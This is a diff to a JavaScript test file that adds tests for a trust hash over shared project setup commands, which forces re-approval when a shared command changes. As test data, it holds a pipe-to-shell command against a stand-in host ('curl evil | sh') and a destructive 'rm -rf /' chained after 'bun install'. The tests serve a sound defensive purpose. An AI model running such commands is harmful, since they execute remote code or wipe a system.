@@ -9,6 +9,7 @@ import {
   mergeProjectSetup,
   normalizePlansDir,
   parseSharedProjectConfig,
+  sharedTrustHashOf,
   projectSetupPatchToStored,
   projectSetupViewOf,
   sanitizeDraftStarters,
@@ -24,6 +25,7 @@ const emptyPersonal = {
   projectActionsPrimaryId: null,
   draftStarters: [],
   hiddenSharedActionIds: [],
+  sharedTrust: null,
 };
 
 const createRuntime = async () => {
@@ -108,6 +110,7 @@ describe('project setup sanitizers', () => {
       projectActionsPrimaryId: 'missing',
       draftStarters: [{ type: 'skill', name: 's' }],
       hiddenSharedActionIds: ['dev', '', 'dev', 7],
+      sharedTrust: { hash: 'sha256:abc', trustedAt: 5 },
       scheduledTasks: [{ id: 't' }],
     })).toEqual({
       setupWorktree: ['bun install'],
@@ -117,6 +120,7 @@ describe('project setup sanitizers', () => {
       projectActionsPrimaryId: null,
       draftStarters: [{ type: 'skill', name: 's' }],
       hiddenSharedActionIds: ['dev'],
+      sharedTrust: { hash: 'sha256:abc', trustedAt: 5 },
     });
     expect(projectSetupViewOf(null)).toEqual(emptyPersonal);
   });
@@ -140,6 +144,9 @@ describe('project setup sanitizers', () => {
     expect(() => projectSetupPatchToStored({ draftStarters: null })).toThrow('draftStarters must be');
     expect(() => projectSetupPatchToStored({ hiddenSharedActionIds: 'dev' })).toThrow('hiddenSharedActionIds must be');
     expect(() => projectSetupPatchToStored({ setupWorktreeMode: 'merge' })).toThrow('setupWorktreeMode must be');
+    expect(() => projectSetupPatchToStored({ sharedTrustHash: '' })).toThrow('sharedTrustHash must be');
+    expect(projectSetupPatchToStored({ sharedTrustHash: null })).toEqual({ sharedTrust: undefined });
+    expect(projectSetupPatchToStored({ sharedTrustHash: 'sha256:x' }).sharedTrust).toMatchObject({ hash: 'sha256:x' });
     expect(() => projectSetupPatchToStored([])).toThrow('patch must be');
   });
 });
@@ -227,6 +234,31 @@ describe('shared project config', () => {
     ]);
     expect(merged.shared).toEqual({ status: 'ok', path: '.openchamber/project.json', ...shared.config });
     expect(merged.personal).toBe(personal);
+    expect(merged.trust).toEqual({ hash: sharedTrustHashOf(shared.config), trusted: false });
+  });
+
+  it('hashes the executable parts of the shared config, order-independent for actions', () => {
+    const base = { setupWorktree: ['bun install'], projectActions: [{ id: 'b', name: 'B', command: 'y', icon: null }, { id: 'a', name: 'A', command: 'x', icon: null }], draftStarters: [], plansDir: null, setupWorktreeWait: null };
+    const hash = sharedTrustHashOf(base);
+    expect(hash).toMatch(/^sha256:[0-9a-f]{64}$/);
+    expect(sharedTrustHashOf({ ...base, projectActions: [...base.projectActions].reverse() })).toBe(hash);
+    // Renaming or re-describing does not change what runs; changing a command does.
+    expect(sharedTrustHashOf({ ...base, projectActions: base.projectActions.map((a) => ({ ...a, name: 'Renamed', icon: 'rocket' })) })).toBe(hash);
+    expect(sharedTrustHashOf({ ...base, setupWorktree: ['curl evil | sh'] })).not.toBe(hash);
+    expect(sharedTrustHashOf({ ...base, projectActions: [{ ...base.projectActions[0], runIn: 'parent' }, base.projectActions[1]] })).not.toBe(hash);
+    expect(sharedTrustHashOf({ ...base, setupWorktree: [], projectActions: [] })).toBeNull();
+  });
+
+  it('reports trust: nothing to trust without executable shared parts, trusted only for the recorded hash', () => {
+    const inert = { status: 'ok', config: { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [{ type: 'skill', name: 's' }], plansDir: null } };
+    expect(mergeProjectSetup(emptyPersonal, inert).trust).toEqual({ hash: null, trusted: true });
+    expect(mergeProjectSetup(emptyPersonal, { status: 'missing' }).trust).toEqual({ hash: null, trusted: true });
+
+    const risky = { status: 'ok', config: { ...inert.config, setupWorktree: ['bun install'] } };
+    const hash = sharedTrustHashOf(risky.config);
+    expect(mergeProjectSetup(emptyPersonal, risky).trust).toEqual({ hash, trusted: false });
+    expect(mergeProjectSetup({ ...emptyPersonal, sharedTrust: { hash, trustedAt: 1 } }, risky).trust.trusted).toBe(true);
+    expect(mergeProjectSetup({ ...emptyPersonal, sharedTrust: { hash: 'sha256:stale', trustedAt: 1 } }, risky).trust.trusted).toBe(false);
   });
 
   it('lets the personal wait flag and replace mode win over shared', () => {
@@ -382,6 +414,16 @@ describe('project setup runtime', () => {
       expect(view.projectActions.map((action) => `${action.id}:${action.source}`)).toEqual(['dev:shared', 'mine:personal']);
       expect(view.draftStarters).toEqual([{ type: 'skill', name: 'triage', source: 'shared' }]);
       expect(view.personal.hiddenSharedActionIds).toEqual(['lint']);
+
+      expect(view.trust.trusted).toBe(false);
+      const trusted = await runtime.updateProjectSetup(projectId, { sharedTrustHash: view.trust.hash });
+      expect(trusted.trust.trusted).toBe(true);
+      expect(trusted.personal.sharedTrust?.hash).toBe(view.trust.hash);
+      // A pull that changes a shared command invalidates the answer.
+      await writeFile(path.join(repo, '.openchamber', 'project.json'), JSON.stringify({ version: 1, setupWorktree: ['bun install && rm -rf /'] }));
+      expect((await runtime.readProjectSetup(projectId)).trust.trusted).toBe(false);
+      const reset = await runtime.updateProjectSetup(projectId, { sharedTrustHash: null });
+      expect(reset.personal.sharedTrust).toBeNull();
     } finally {
       await cleanup();
     }
